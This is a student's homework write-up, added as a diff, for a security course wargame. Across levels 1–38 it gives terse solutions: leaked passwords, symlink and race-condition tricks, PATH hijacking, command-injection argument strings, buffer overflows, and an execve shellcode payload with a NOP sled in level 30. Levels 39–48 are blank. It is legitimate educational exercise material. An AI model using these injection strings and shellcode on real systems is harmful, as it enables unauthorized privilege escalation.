@@ -1,0 +1,50 @@
+CCSE365 Hw 3 Level Explanations
+1. By analyzing the source 1.c file, I noticed the password was "TheGreatPassw0rd".
+2. I created a symlink called "JyvPr6Tk52mTyqoSeQmx" that pointed /var/challenge/2. 
+3. I added my home directory to $PATH and ran the password again. 
+4. By analyzing the source 4.c file, I noticed the password was "py26jr5mmLktuNIy2Apt".
+5. I took the hash found in 5.c ("b5884fb8c8785eae504f2816f0451e42") and entered it into an online MD5 decryptor and got "mylittlepony" as the password. 
+6. I researched online what hashed strings began with null pointers and used "168" as my password. 
+7. Wrote a c program that predicts all 50 file names and in another window I ran ./7.
+8. I created a symlink pointing to /var/challenge/level/.secret in my home directory. 
+9. Same process as level 8 but pointed the symlink to /var/challenge/level9. 
+10. I added my home directory to the BASE variable and ran the symlink pointed at /var/challenge/level10.
+11. Same process as level 10 but added double // to bypass the strcmp() check. 
+12. Same process as level 11 but I did not use a symlink. 
+13. I created a temp folder in my home directory and placed a temp file inside the folder. I pointed the BASE variable to the temp file, then quickly swapped the file with a symlink pointing to /var/challenge/level13/.secret.
+14. By using double quotes, we can pass l33t as the first argument: ./14 ";l33t".
+15. I created a temp file named 'caca' and ran ./15 "\"caca; l33t \"" inside of level15 directory.
+16. ./16 '$(l33t)', used $() to execute l33t. 
+17. I created a symlink (tidy) pointing to /usr/local/bin/l33t, I then ran ./17 tidy inside of the level17 directory.  
+18. I created another symlink (test) pointing to /var/challenge/level18/18. I then ran ./test tidy in my home directory. 
+19. ./19 "\$(l33t)", used double quotes to pass the check.   
+20. ./20 "\||(l33t)", used double quotes with the edition of ||.
+21. ./21 "\`l33t\`", | no longer works, so I used single ticks. 
+22. ./22 "\&&(l33t)", single ticks no longer works, so I used double &&.
+23. ./23 "\&&(l33t)", same as previous level. 
+24. ./24 "24\" -exect l33t {} +\"", parenthesis no longer work, so I used -exect command.   
+25. ./25 "25 -exec l33t {} +", since double quotations were not needed, those were removed. 
+26. ./26 "tidy\" -exec {} +\"", tidy is a symlink to l33t.
+27. ./27 d 0x401177, followed the lecture walkthrough and once in the shell I used the l33t command.
+28. ./28 9 13371337, updated deadb33f in the stack to 13371337, once in the shell I used the l33t command.
+29. ./29 004034a0 13371337, same as previous level but the exact location on the stack. 
+30. create environment variable EGG=$(python3 -c "import sys;sys.stdout.buffer.write(b'\x90'*0x10000+b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')"),
+then run ./30, enter 11, I then added 0x10000 to the current stack pointer, a shell is given so execute l33t.
+31. I overflowed the buffer with a reaaally long random string.
+32. I overflowed the buffer with a 64 byte long string that hash starts with \x00. 
+33. I encrypted the string found in source code in md5 and used that as the password.   
+34. I overflowed the buffer to change /bin/cat/ to usr/local/bin/l33t.
+35. Same as level 32, I overflowed the buffer with a 64 byte long string that hash starts with \x00.
+36. ./36 $(python2 -c "print('185aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x01\xd2\xa5\x78\xc3\x74\x90\xa9\xd7\x23\x65\x99\x1b\x76\x60\x52')").
+37. I used the same command as level 34. 
+38. Followed the demo video but changed the port to 7373. 
+39. 
+40. 
+41. 
+42. 
+43. 
+44. 
+45. 
+46. 
+47. 
+48. 
